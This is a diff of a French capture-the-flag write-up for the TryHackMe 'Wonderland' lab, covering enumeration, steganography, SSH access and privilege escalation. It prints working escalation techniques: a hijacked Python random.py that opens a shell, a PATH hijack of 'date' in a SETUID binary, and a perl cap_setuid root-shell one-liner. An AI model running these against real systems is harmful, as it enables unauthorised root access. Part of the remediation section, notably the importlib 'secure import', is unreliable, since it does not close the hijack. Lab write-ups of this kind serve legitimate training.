@@ -1,6 +1,8 @@
-# Wonderland 
+# Wonderland
+
 lien : https://tryhackme.com/room/wonderland
-## NMAP 
+
+## NMAP
 
 ```bash
 $ nmap -sC -sV -oA nmap/initialScan 10.10.209.89
@@ -22,8 +24,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Fri Mar  3 05:34:52 2023 -- 1 IP address (1 host up) scanned in 18.40 seconds
 ```
 
----
+* * *
+
 ## GOBUSTER
+
 ```bash
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.209.89/ -o gobuster/GobusterMedium -x html
 ===============================================================
@@ -46,10 +50,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /r                    (Status: 301) [Size: 0] [--> r/]
 /poem                 (Status: 301) [Size: 0] [--> poem/]
 ```
+
 **/img** contient des images, nous allons les télécharger et les analyser:
 
----
+* * *
+
 ### WGET
+
 ```bash
 ┌──(kali㉿kali)-[~/tryHackMe/room/Wonderland/website_data]
 └─$ wget -r --no-parent http://10.10.209.89/img/
@@ -72,9 +79,10 @@ Le dossier contient 3 images :
 2 directories, 4 files
 ```
 
-
 ### STEGHIDE
-**steghide** ne renvoie rien d'intéressant des images 'alice_door.jpg' et 'alice_door.png'
+
+**steghide** ne renvoie rien d'intéressant des images 'alice\_door.jpg' et 'alice\_door.png'
+
 ```bash
 ┌──(kali㉿kali)-[~/tryHackMe/room/Wonderland/website_data]
 └─$ steghide extract -sf img/white_rabbit_1.jpg
@@ -88,7 +96,7 @@ follow the r a b b i t
 
 **steghide** vient d'extraire la phrase suivante : '**follow the r a b b i t**'
 Il y a un espace entre chaque lettre de rabbit, pourquoi ?
-Rappelez-vous, nous avons un chemin '**/r**' dans notre sortie de gobuster, on va essayer d'acceder au chemain suivant /r/a/b/b/i/t/
+Rappelez-vous, nous avons un chemin '**/r**' dans notre sortie de gobuster, on va essayer d'accéder au chemin suivant /r/a/b/b/i/t/
 
 ```bash
 $ curl http://10.10.142.253/r/a/b/b/i/t/ 
@@ -110,6 +118,7 @@ $ curl http://10.10.142.253/r/a/b/b/i/t/
     <img src="/img/alice_door.png" style="height: 50rem;">
 </body>
 ```
+
 On voit qu'il y a un paragraphe caché sur la page html, qui contient une information qui pourrait bien ressembler à des identifiants.
 Nous allons essayer de nous connecter en **ssh** puisque le port 22 est ouvert:
 
@@ -146,8 +155,10 @@ uid=1001(alice) gid=1001(alice) groups=1001(alice)
 
 ```
 
----
+* * *
+
 ## USER FLAG
+
 ```bash
 alice@wonderland:~$ ls
 root.txt  walrus_and_the_carpenter.py
@@ -164,8 +175,9 @@ thm{"**************"}
 
 Bien, nous venons de trouver le flag de **user**!
 
----
-La commande ```sudo -l``` permet de lister les privilèges qu'un utilisateur possède avec 'sudo' :
+* * *
+
+La commande `sudo -l` permet de lister les privilèges qu'un utilisateur possède avec 'sudo' :
 
 ```bash
 alice@wonderland:~$ sudo -l
@@ -176,9 +188,10 @@ Matching Defaults entries for alice on wonderland:
 User alice may run the following commands on wonderland:
     (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 
-````
+```
 
-Affichons le script **'/home/alice/walrus_and_the_carpenter.py**':
+Affichons le script **'/home/alice/walrus\_and\_the_carpenter.py**':
+
 ```python
 alice@wonderland:~$ cat walrus_and_the_carpenter.py 
 import random
@@ -193,25 +206,29 @@ for i in range(10):
     line = random.choice(poem.split("\n"))
     print("The line was:\t", line)
 ```
+
 Ce script génère 10 lignes aléatoires extraites du poème "The Walrus and the Carpenter" de Lewis Carroll en utilisant le module "random" de Python.
-La première partie du script définit une chaîne de caractères qui contient le poème complet sous la variable poem. Le poème est ensuite divisé en lignes en utilisant la méthode split("\n"), qui retourne une liste de toutes les lignes.
+La première partie du script définit une chaîne de caractères qui contient le poème complet sous la variable poem. Le poème est ensuite divisé en lignes en utilisant la méthode split("\\n"), qui retourne une liste de toutes les lignes.
 Ensuite, une boucle for est utilisée pour itérer 10 fois. À chaque itération, une ligne aléatoire est choisie à partir de la liste de lignes en utilisant la fonction random.choice(), et est stockée dans la variable line. La ligne sélectionnée est ensuite imprimée à l'écran avec le préfixe "The line was:" en utilisant la fonction print().
 
-Le script **walrus_and_the_carpenter.py** importe le module **random**, on va créer un fichier **random.py** pour voir si le script charge notre module perso **random.py** lors de l'excecution du script:
+Le script **walrus\_and\_the_carpenter.py** importe le module **random**, on va créer un fichier **random.py** pour voir si le script charge notre module perso **random.py** lors de l'excecution du script:
 
 On créé un fichier **random.py** dans **/home/alice/** :
+
 ```python3
 import os
 
 os.system("/bin/bash")
 ```
 
-On lance le script : 
+On lance le script :
+
 ```bash
 alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 ```
 
-Resultat :
+Résultat :
+
 ```bash
 rabbit@wonderland:~$ id                                                                                             
 uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit) 
@@ -219,7 +236,7 @@ uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
 
 Bien! Nous sommes connectés maintenant avec l'utilisateur **'rabbit'**.
 
-Vérifions les fichiers qui ont le bit SETUID activé avec la commande ```find / -perm -u=s -type f 2>/dev/null```  à partir de la racine "/".
+Vérifions les fichiers qui ont le bit SETUID activé avec la commande `find / -perm -u=s -type f 2>/dev/null` à partir de la racine "/".
 
 Le bit SETUID est un attribut de fichier qui permet à un utilisateur d'exécuter un programme avec les mêmes privilèges que le propriétaire du fichier. Cela peut être utile pour les programmes qui nécessitent des privilèges élevés pour fonctionner correctement.
 
@@ -251,15 +268,17 @@ rabbit@wonderland:~$ find / -perm -u=s -type f 2>/dev/null
 /bin/su
 
 ```
+
 Le fichier **'/home/rabbit/teaParty'** à le bit SETUID activé, nous allons essayer de télécharger et analyser ce fichier :
 
 Nous pouvons télécharger le fichier binaire à l'aide du module http.server de python3 :
 
-- Target : ```python3 -m http.server 9090```
+- Target : `python3 -m http.server 9090`
+    
+- Kali: `wget http://10.10.209.89:9090/teaParty`
+    
 
-- Kali: ```wget http://10.10.209.89:9090/teaParty ```
-
-Analyse avec **strings** du binaire  **teaParty** :
+Analyse avec **strings** du binaire **teaParty** :
 
 ```bash
 $ strings teaParty                                                                                                                                                                                                                                                                                      
@@ -271,9 +290,12 @@ Ask very nicely, and I will give you some tea while you wait for him
 Segmentation fault (core dumped)
 ...SNIPPED...
 ```
+
 En examinant le fichier **teaParty** nous voyons que '**date**' est exécuté sans spécifier de chemin absolu.
 On va donc créer un fichier '**date**' dans '**/tmp/date**' et changer le **PATH** pour que teaParty utilise notre fichier **date** personnalisé:
-- Création du fichier date avec la commande ```nano /tmp/date``` :
+
+- Création du fichier date avec la commande `nano /tmp/date` :
+
 ```bash
 #!/bin/bash
 echo ""
@@ -282,9 +304,10 @@ echo "Test Date Hijacked"
 ~
 ```
 
-- Changement de notre PATH avec la commande ```export PATH=/tmp:$PATH```
+- Changement de notre PATH avec la commande `export PATH=/tmp:$PATH`
 
-On peut maintenant lancer le binaire teaParty avec la commande ```./teaParty```:
+On peut maintenant lancer le binaire teaParty avec la commande `./teaParty`:
+
 ```bash
 rabbit@wonderland:/home/rabbit$ ./teaParty
 Welcome to the tea party!
@@ -298,13 +321,16 @@ hatter
 
 Bien, nous avons élevé nos privilèges, nous utilisons maintenant l'utilisateur **'hatter'**.
 Nous pouvons donc nous rendre dans **/home/hatter** et afficher le password:
+
 ```bash
 hatter@wonderland:/home/hatter$ cat password.txt 
 ***************
 ```
 
 Nous faisons notre énumération standard en utilisant **linPEAS** :
+
 ## LINPEAS
+
 ```bash
 ...SNIPPED...
 ╔══════════╣ Capabilities                                                                                                                                                               │  File "/usr/lib/python3.11/http/server.py", line 674, in do_GET
@@ -320,6 +346,7 @@ Files with capabilities (limited to 50):                                        
 
 Nous voyons que **/usr/bin/perl** a des capacités **cap_setuid+ep**.
 Nous pouvons lancer la commande suivante pour devenir root:
+
 ```bash
 hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 hatter@wonderland:~$ whoami;id
@@ -328,26 +355,28 @@ uid=0(root) gid=1003(hatter) groups=1003(hatter)
 ```
 
 Enfin, nous pouvons afficher le contenu du flag **/home/alice/root.txt**:
+
 ```bash
 # cat /home/alice/root.txt
 thm{********************}
 ```
 
+* * *
 
----
 ## FIX
 
-#### 1. Éviter de cacher des informations sensibles dans des images.
+#### 1\. Éviter de cacher des informations sensibles dans des images.
 
+#### 2\. Modifier le script python **walrus\_and\_the_carpenter.py** :
 
-#### 2. Modifier le script python **walrus_and_the_carpenter.py** :
 Pour importer le module **random** de manière sécurisée dans votre script Python, vous pouvez utiliser l'approche suivante:
+
 - Utilisez le module **importlib** pour importer le module **random** de manière dynamique et sécurisée, en utilisant la fonction import_module.
 - Utilisez un alias pour le module random, pour éviter les conflits de noms avec des variables ou des fonctions dans votre script.
 
 Voici un exemple de code pour importer **random** de manière sécurisée:
-```python
 
+```python
 import importlib
 
 try:
@@ -358,29 +387,30 @@ except ImportError:
 # Utilisez l'alias "rand" pour éviter les conflits de noms
 rand = random.Random()
 ```
->Ce code importe random de manière sécurisée, en utilisant la fonction import_module du module importlib. 
-Si l'importation échoue, une erreur ImportError est levée avec un message explicatif. 
-Ensuite, un alias rand est créé pour le module random. 
-Cet alias peut être utilisé pour accéder aux fonctions et méthodes du module random dans votre script.
 
+> Ce code importe random de manière sécurisée, en utilisant la fonction import_module du module importlib.
+> Si l'importation échoue, une erreur ImportError est levée avec un message explicatif.
+> Ensuite, un alias rand est créé pour le module random.
+> Cet alias peut être utilisé pour accéder aux fonctions et méthodes du module random dans votre script.
 
-#### 3. Fichier teaParty :
+#### 3\. Fichier teaParty :
+
 - Utiliser le chemin complet pour utiliser **date**:
-	changer la commande dans teaParty :
-	``` /bin/echo -n 'Probably by ' && date --date='next hour' -R``` 
-	avec :
-	``` /bin/echo -n 'Probably by ' && /usr/bin/date --date='next hour' -R``` 
+    changer la commande dans teaParty :
+    `/bin/echo -n 'Probably by ' && date --date='next hour' -R`
+    avec :
+    `/bin/echo -n 'Probably by ' && /usr/bin/date --date='next hour' -R`
 - Changer les permissions du fichier **teaParty**
-```sudo chmod 600 teaParty```
+    `sudo chmod 600 teaParty`
 
+#### 4\. Changer les capacités UID
 
-#### 4. Changer les capacités UID
-Pour rendre les fichiers exécutables **cap_setuid** et **cap_net_raw**  uniquement par l'utilisateur **root**, utilisez la commande suivante:
+Pour rendre les fichiers exécutables **cap_setuid** et **cap\_net\_raw** uniquement par l'utilisateur **root**, utilisez la commande suivante:
 
 ```bash
 sudo setcap -r /usr/bin/perl5.26.1
 sudo setcap -r /usr/bin/mtr-packet
 sudo setcap -r /usr/bin/perl
 ```
-La commande **setcap** est utilisée pour définir ou supprimer les capacités de sécurité d'un fichier. L'option -r est utilisée pour supprimer toutes les capacités de sécurité d'un fichier. En exécutant ces commandes avec les privilèges de superutilisateur (sudo), vous pouvez retirer les capacités de sécurité et restreindre l'accès à ces fichiers uniquement à l'utilisateur root.
 
+La commande **setcap** est utilisée pour définir ou supprimer les capacités de sécurité d'un fichier. L'option -r est utilisée pour supprimer toutes les capacités de sécurité d'un fichier. En exécutant ces commandes avec les privilèges de super-utilisateur (sudo), vous pouvez retirer les capacités de sécurité et restreindre l'accès à ces fichiers uniquement à l'utilisateur root.
